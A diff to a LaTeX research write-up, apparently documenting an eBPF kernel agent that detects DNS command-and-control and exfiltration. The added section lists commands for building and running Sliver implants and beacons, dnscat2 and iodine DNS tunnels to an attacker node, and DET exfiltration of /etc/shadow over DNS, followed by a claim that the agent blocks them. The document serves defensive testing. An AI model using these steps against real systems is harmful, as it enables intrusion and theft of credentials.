@@ -1763,11 +1763,6 @@ BPF_PROG(bpf, int cmd, union bpf_attr *attr, unsigned int size) {
 }
 \end{lstlisting}
 
-agent have dedicated set of eBPF programs written and injected into the core kernel security layers via interception over LSM (Linux security modules) hooks
-All the eBPF programs in kernel injected by the agents in data plane 
-
-
-
 \subsection{Instructions for compiling and deploying the eBPF node agent at the endpoint}
 The repository has individual make targets for building and deploying the agent, as well as README in root for build instructions. The steps to build and deploy the agent over all the nodes in the dataplane are explained below, however please ensure the required distributed infrastructure (DNS server, Kafka brokers) are running as well as the control plane. 
 
@@ -1916,44 +1911,81 @@ def DGA_MASS_DOMAINS_GEN(args):
 \vspace{-1em}
 
 \subsection{Instructions to implement DNS Data exfiltration attacks on data plane}
-The tools focused currently and fully evaulated are higest rated C2 matrix tools supporting most advanced forms of C2 comamnds and other types of data exfiltration. Each tool and attack carrying steps are explained below. Note in order to select a domain as explained before ocne the DGA algrithma dn vast number of domains are generated resolving to the attacker node IP, any domain from can be selected to start using these tools. 
+The tools currently focused on and fully evaluated are among the highest-rated in the C2 matrix, supporting the most advanced forms of command and control operations as well as various types of data exfiltration. Each tool and the corresponding steps to carry out the attacks are explained below. Note that once the DGA algorithm generates a large number of domains resolving to the attacker’s node IP, any of these domains can be selected to initiate the use of these tools.
 \subsubsection{Sliver}
-\begin{lstlisting}[language=bash,caption={Steps to deploy Sliver implant},label={lst:sliver-steps}]
+Sliver being highest reputed adversary emulation framework developed by BishopFox for advanced penetration testing, the official documentation provides detailed steps on \href{https://github.com/BishopFox/sliver/blob/master/README.md}{Github} to clone and build sliver C2 framework.
+\begin{lstlisting}[language=bash,caption={Steps to use Sliver for DNS C2},label={lst:sliver-steps}]
 # 1. Start Sliver C2 server on attacker node
 sliver-server
-
 # 2. Connect to Sliver client console from same node
 sliver-client
-
 # 3. Start the DNS Server job 
-job -d <c2_domain_ip> 
-
-# 3. Generate implant payload (e.g., ELF for Linux)
-generate --os linux --arch amd64 --output /tmp/implant --save
-
+job -d <c2_domain>. 
+# 3. Generate implant binary for session based (less stealthy generate more DNS traffic during C2 attacks)
+generate --dns <c2_domain> --debug --os linux --arch amd64 --save /tmp/implant 
+# 3. Generate implant binary for session based (less stealthy generate more DNS traffic during C2 attacks)
+generate --dns <c2_domain> --poll-timeout <beacon_interval> --debug --os linux --arch amd64 --save /tmp/implant_beacon 
 # 4. Transfer implant to any host in data plane
 scp /tmp/implant user@remote:/tmp/
-
 # 5. Run the implant on the remote host
-chmod +x /tmp/implant.elf
-/tmp/implant
-
-# 6. Confirm session established in Sliver console
+chmod +x /tmp/implant
+chmod +x /tmp/implant_beacon
+./tmp/implant
+./tmp/implant_beacon
+# 6 carry all the c2 attacks once system is compromised and beacon, session implant connected to c2 server
+# 6. Confirm session, beacons established in Sliver console
 sessions
+beacons
+# 7. connect sliver c2 server to start exploiting compromised sessions or beacons
+use <session_id>
+use <beacon_id>
 \end{lstlisting}
 
 \subsubsection{Dnscat2}
+Dnscat2 documentation for building the dnscat2 server and client can be found on official documentation page at \href{https://github.com/iagox86/dnscat2/blob/master/README.md}{Github}.
+\begin{lstlisting}[language=bash,caption={Steps to use Dnscat2 for Dns C2},label={lst:sliver-steps}]
+# 1. Start Dnscat2 C2 server on attacker node without port obfuscation, default DNS tunnelling over Port 53/udp 
+sudo ruby dnscat2.rb --dns 'host=<attacker_node>,domain=<c2_domain>'
+# 2. Connect to dnscat c2 server from compromised node in data plan
+./dnscat --secret=<c2_connection_secret> <c2_domain>
+# 6 carry all the c2 attacks once compromised node is connected to C2 server.
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={Steps to use Dnscat2 for Dns C2 with DNS port obfuscation layered random UDP port},label={lst:sliver-steps}]
+# 1. Start Dnscat2 C2 server on attacker node with port obfuscation, DNS protocol itself tunnelled over random UDP port with internally tunnelling any protocol payload
+sudo ruby dnscat2.rb --dns 'host=<attacker_node>,port=<dns_overlay_udp_port>,domain=<c2_domain>'
+# 2. Connect to dnscat c2 server from compromised node in data plan
+./dnscat --dns server=<attacker_node>=<dns_overlay_udp_port>,domain=dnscat.strive.io --secret=<c2_session_secret>
+# 6 carry all the c2 attacks once compromised node is connected to C2 server.
+\end{lstlisting}
 
 
 \subsubsection{Iodine}
-
+Iodine documentation for building the Iodine tunnel server server and client can be found on official documentation page at \href{https://github.com/yarrick/iodine}{Github}
+\begin{lstlisting}[language=bash,caption={Steps to use Iodine for Dns tunnelling using kernel encapsulation ppp TUN/TAP links},label={lst:sliver-steps}]
+# 1. Start iodine tunneling server 
+sudo iodined -f -P <password> <TUN/TAP_overlay_CIDR> <tunnel_domain>
+# 2. Verify the required TUN/TAP pointtopoint netdev link created, defaults to dns0 
+ip addr show dev dns0 
+# 3. On compromised node in data plane start the iodine client 
+sudo iodine -P <password> -f  -r <tunnel_server> <tunnel_domain>
+# 4 Verify the required TUN/TAP pointtopoint netdev link created in CIDR range default to <TUN/TAP_overlay_CIDR>/24
+ip addr show dev dns0
+# Tunnel any protocol payload through the compromised node encpasulated traffic passed through PPP TUN/TAP links on both systems.
+\end{lstlisting}
 
 \subsubsection{DET}
+DET documentation for building the Iodine tunnel server server and client can be found on official documentation page at \href{https://github.com/sensepost/DET}{Github}
+\begin{lstlisting}[language=bash,caption={Steps to use DET for raw DNS exfiltration},label={lst:sliver-steps}]
+# 1. Configure the DNS module in config.json in DET for raw exfiltration, with any domain generated via DGA, and IP pointing to the DNS server.
+# 2. Start the DET server
+sudo python det.py -L -c ./config.json -p dns 
+# 3. Configure the DNS module in config.json in DET for raw exfiltration, with any domain generated via DGA, and IP pointing to the DNS server.
+python det.py -c ./config.json -f /etc/shadow
+3 4. restart the script and continue to exfiltrate files via raw DNS exfiltration. 
+\end{lstlisting}
 
-
-
-
-
+Finally, if the eBPF node agent—along with all injected programs in the kernel—is active at the data plane endpoint, any C2 command requests, responses, file exfiltration attempts, or tunneled data will be terminated instantaneously. All tools initiating the exfiltration will be forcefully killed, with detailed metrics exported to identify the origin of the attack. Additionally, all involved domains will be dynamically blacklisted, rendering them useless for further exploitation. At the same time, communication between the compromised node in the data plane and the C2 server will be severed through in-kernel dynamic network policies.
 
 
 % \begin{figure}[H]
